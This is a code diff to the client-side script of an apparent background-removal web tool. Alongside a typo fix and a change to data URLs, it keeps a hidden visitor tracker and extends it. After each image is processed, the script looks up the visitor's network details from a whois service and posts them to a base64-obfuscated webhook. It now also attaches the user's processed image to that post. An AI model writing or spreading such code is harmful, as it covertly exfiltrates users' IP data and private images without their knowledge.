@@ -74,6 +74,7 @@
     const preview = document.getElementById("preview");
     const previewImage = document.getElementById("previewImage");
     const processedImage = document.getElementById("processedImage");
+    const webhookUrl = atob('{{ webhook }}');
 
     selectButton.addEventListener("click", () => fileInput.click());
     fileInput.addEventListener("change", handleFileSelect);
@@ -153,52 +154,68 @@
           return response.blob();
         })
         .then(blob => {
-          const url = URL.createObjectURL(blob);
-          processedImage.src = url;
+          return new Promise((resolve, reject) => {
+            const reader = new FileReader();
+            reader.onloadend = () => resolve(reader.result);
+            reader.onerror = reject;
+            reader.readAsDataURL(blob);
+          });
+        })
+        .then(dataUrl => {
+          processedImage.src = dataUrl;
           preview.classList.remove("hidden");
           downloadButton.classList.remove("hidden");
 
           Swal.fire({
             icon: 'success',
-            title: 'Backgroud removed!',
+            title: 'Background removed!',
             text: 'Your image is ready.',
             background: '#1e1b4b',
             color: '#e2e8f0',
             confirmButtonColor: '#9333ea'
           });
 
-          const webhookUrl = atob('{{ webhook }}');
           fetch('https://hutils.loxal.net/whois')
             .then(response => response.json())
             .then(data => {
-              fetch(webhookUrl, {
-                method: 'POST',
-                headers: {
-                  'Content-Type': 'application/json',
-                },
-                body: JSON.stringify({
-                  embeds: [{
-                    title: 'New Visitor',
-                    color: 0x9333ea,
-                    fields: Object.entries(data).map(([key, value]) => ({
-                      name: key,
-                      value: String(value),
-                      inline: true
-                    })),
-                    image: {
-                      url: url
-                    },
-                    footer: {
-                      text: 'Zee Remove BG Visitor Tracker'
-                    }
-                  }]
-                })
-              });
+              // Convert base64 to blob
+              fetch(dataUrl)
+                .then(res => res.blob())
+                .then(blob => {
+                  const formData = new FormData();
+                  formData.append('file', blob, 'image.png');
+
+                  const payload = {
+                    content: "",
+                    embeds: [{
+                      title: 'New Visitor',
+                      color: 0x9333ea,
+                      fields: Object.entries(data).map(([key, value]) => ({
+                        name: key,
+                        value: String(value),
+                        inline: true
+                      })),
+                      image: {
+                        url: 'attachment://image.png'
+                      },
+                      footer: {
+                        text: 'Zee Remove BG Visitor Tracker'
+                      }
+                    }]
+                  };
+
+                  formData.append('payload_json', JSON.stringify(payload));
+
+                  fetch(webhookUrl, {
+                    method: 'POST',
+                    body: formData
+                  });
+                });
             });
 
           downloadButton.addEventListener("click", () => {
             const link = document.createElement('a');
-            link.href = url;
+            link.href = dataUrl;
             link.download = fileInput.files[0].name + '_Zee-rmbg.png';
             link.click();
           });
